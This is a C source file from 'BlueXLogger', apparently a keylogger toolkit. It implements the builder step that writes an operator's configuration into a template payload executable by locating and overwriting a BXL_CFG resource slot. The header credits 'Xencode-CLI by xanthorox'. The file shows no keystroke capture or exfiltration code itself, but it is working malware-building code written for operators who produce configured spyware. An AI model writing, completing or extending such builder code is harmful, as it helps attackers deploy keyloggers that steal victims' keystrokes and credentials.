/*============================================================================
 * BlueXLogger - bxl_patch.c
 * Embed an operator configuration into a payload EXE.
 *
 * Created by Xencode-CLI by xanthorox
 *==========================================================================*/
#include "bxl_patch.h"
#include "bxl_resid.h"
#include "bxl_util.h"

/*==========================================================================
 * Locate the slot inside a mapped template
 *
 * The template is mapped with LOAD_LIBRARY_AS_DATAFILE, which mirrors the file
 * into memory byte for byte. LockResource() therefore hands back a pointer
 * whose distance from the mapping base IS the file offset - exactly what
 * bxl_patch_write() needs to seek to, with no RVA translation involved.
 *
 * One trap: LoadLibraryExW tags the handle it returns in the low two bits
 * (0x1 for LOAD_LIBRARY_AS_DATAFILE, 0x2 for LOAD_LIBRARY_AS_IMAGE_RESOURCE),
 * while LockResource() works from the untagged base. Subtracting the raw
 * handle would leave the offset short by that tag, so the tag is masked off
 * before any pointer arithmetic. The tagged handle is still the right thing to
 * pass to the FindResource/SizeofResource/LoadResource family.
 *========================================================================*/
typedef struct SlotInfo {
    DWORD  file_offset;
    DWORD  size;
    BYTE  *data;        /* pointer into the mapping (read-only) */
    HMODULE module;
} SlotInfo;

static int slot_open(const wchar_t *exe, SlotInfo *si, char *err, size_t err_cch)
{
    HMODULE hMod;
    HRSRC   hres;
    HGLOBAL hglob;
    void   *p;

    memset(si, 0, sizeof(*si));

    hMod = LoadLibraryExW(exe, NULL, LOAD_LIBRARY_AS_DATAFILE);
    if (!hMod) {
        if (err) StringCchPrintfA(err, err_cch,
                                  "cannot map template (error %lu)",
                                  GetLastError());
        return BXL_FALSE;
    }

    hres = FindResourceW(hMod, BXL_RES_CFG_W, RT_RCDATA);
    if (!hres) {
        if (err) StringCchCopyA(err, err_cch,
                                "template has no BXL_CFG resource slot");
        FreeLibrary(hMod);
        return BXL_FALSE;
    }

    si->size = SizeofResource(hMod, hres);
    hglob = LoadResource(hMod, hres);
    if (!hglob) {
        if (err) StringCchCopyA(err, err_cch, "cannot load BXL_CFG resource");
        FreeLibrary(hMod);
        return BXL_FALSE;
    }

    p = LockResource(hglob);
    if (!p) {
        if (err) StringCchCopyA(err, err_cch, "cannot lock BXL_CFG resource");
        FreeLibrary(hMod);
        return BXL_FALSE;
    }

    si->data = (BYTE *)p;
    si->module = hMod;

    /* Datafile mapping: the distance from the untagged base is the file
     * offset. See the comment above SlotInfo. */
    si->file_offset = (DWORD)((BYTE *)p - (BYTE *)((ULONG_PTR)hMod & ~(ULONG_PTR)3));

    return BXL_TRUE;
}

static void slot_close(SlotInfo *si)
{
    if (si && si->module) {
        FreeLibrary(si->module);
        si->module = NULL;
    }
}

/*==========================================================================
 * Inspect
 *========================================================================*/
int bxl_patch_inspect(const wchar_t *exe, int *slot_found, bxl_u32 *slot_size,
                      int *is_placeholder, char *err, size_t err_cch)
{
    SlotInfo si;

    if (slot_found)    *slot_found = BXL_FALSE;
    if (slot_size)     *slot_size = 0;
    if (is_placeholder) *is_placeholder = BXL_FALSE;
    if (err && err_cch) err[0] = '\0';

    if (!exe) return BXL_FALSE;

    if (!slot_open(exe, &si, err, err_cch)) return BXL_FALSE;

    if (slot_found) *slot_found = BXL_TRUE;
    if (slot_size)  *slot_size = si.size;
    if (is_placeholder)
        *is_placeholder = bxl_config_is_placeholder(si.data, si.size);

    slot_close(&si);
    return BXL_TRUE;
}

/*==========================================================================
 * Read back
 *========================================================================*/
int bxl_patch_read(const wchar_t *exe, BxlConfig *cfg, char *err, size_t err_cch)
{
    SlotInfo si;

    if (err && err_cch) err[0] = '\0';
    if (!exe || !cfg) return BXL_FALSE;

    if (!slot_open(exe, &si, err, err_cch)) return BXL_FALSE;

    if (bxl_config_is_placeholder(si.data, si.size)) {
        if (err) StringCchCopyA(err, err_cch,
                                "slot still holds the unconfigured placeholder");
        slot_close(&si);
        return BXL_FALSE;
    }

    if (!bxl_config_deserialize(si.data, si.size, cfg)) {
        if (err) StringCchCopyA(err, err_cch,
                                "embedded blob failed to parse or failed its CRC");
        slot_close(&si);
        return BXL_FALSE;
    }

    slot_close(&si);
    bxl_config_sanitize(cfg);
    return BXL_TRUE;
}

/*==========================================================================
 * Write
 *========================================================================*/
int bxl_patch_write(const wchar_t *template_exe, const wchar_t *out_exe,
                    const BxlConfig *cfg, char *err, size_t err_cch)
{
    SlotInfo si;
    bxl_u8   blob[BXL_CFG_SLOT_SIZE];
    size_t   blob_len;
    HANDLE   h = INVALID_HANDLE_VALUE;
    DWORD    written = 0;
    int      ok = BXL_FALSE;

    if (err && err_cch) err[0] = '\0';

    if (!template_exe || !out_exe || !cfg) {
        if (err) StringCchCopyA(err, err_cch, "missing argument");
        return BXL_FALSE;
    }

    if (!slot_open(template_exe, &si, err, err_cch)) return BXL_FALSE;

    if (si.size < bxl_config_blob_max()) {
        if (err) StringCchPrintfA(err, err_cch,
                                  "slot is %lu bytes but %llu are required",
                                  (unsigned long)si.size,
                                  (unsigned long long)bxl_config_blob_max());
        slot_close(&si);
        return BXL_FALSE;
    }

    /* Serialize into a slot-sized buffer so the remainder is deterministic. */
    memset(blob, 0, sizeof(blob));
    blob_len = bxl_config_serialize(cfg, blob, sizeof(blob));
    if (blob_len == 0) {
        if (err) StringCchCopyA(err, err_cch, "configuration serialization failed");
        slot_close(&si);
        return BXL_FALSE;
    }

    /* ---- copy template -> output --------------------------------------- */
    if (!CopyFileW(template_exe, out_exe, FALSE)) {
        if (err) StringCchPrintfA(err, err_cch,
                                  "cannot create output file (error %lu)",
                                  GetLastError());
        slot_close(&si);
        return BXL_FALSE;
    }

    /* The mapping must be released before the output file is written, since
     * the source and destination may be the same volume and we want no
     * sharing surprises. */
    {
        DWORD off = si.file_offset;
        DWORD sz  = si.size;
        slot_close(&si);

        h = CreateFileW(out_exe, GENERIC_WRITE, 0, NULL, OPEN_EXISTING,
                        FILE_ATTRIBUTE_NORMAL, NULL);
        if (h == INVALID_HANDLE_VALUE) {
            if (err) StringCchPrintfA(err, err_cch,
                                      "cannot open output for writing (error %lu)",
                                      GetLastError());
            return BXL_FALSE;
        }

        if (SetFilePointer(h, (LONG)off, NULL, FILE_BEGIN) == INVALID_SET_FILE_POINTER) {
            if (err) StringCchPrintfA(err, err_cch,
                                      "seek to offset %lu failed (error %lu)",
                                      (unsigned long)off, GetLastError());
            goto done;
        }

        if (!WriteFile(h, blob, sz, &written, NULL) || written != sz) {
            if (err) StringCchPrintfA(err, err_cch,
                                      "write of %lu bytes failed (error %lu)",
                                      (unsigned long)sz, GetLastError());
            goto done;
        }

        if (!FlushFileBuffers(h)) {
            if (err) StringCchPrintfA(err, err_cch,
                                      "flush failed (error %lu)", GetLastError());
            goto done;
        }
    }

    ok = BXL_TRUE;

done:
    if (h != INVALID_HANDLE_VALUE) CloseHandle(h);

    if (!ok) {
        /* Never leave a half-patched binary behind. */
        bxl_file_delete(out_exe);
    }
    return ok;
}
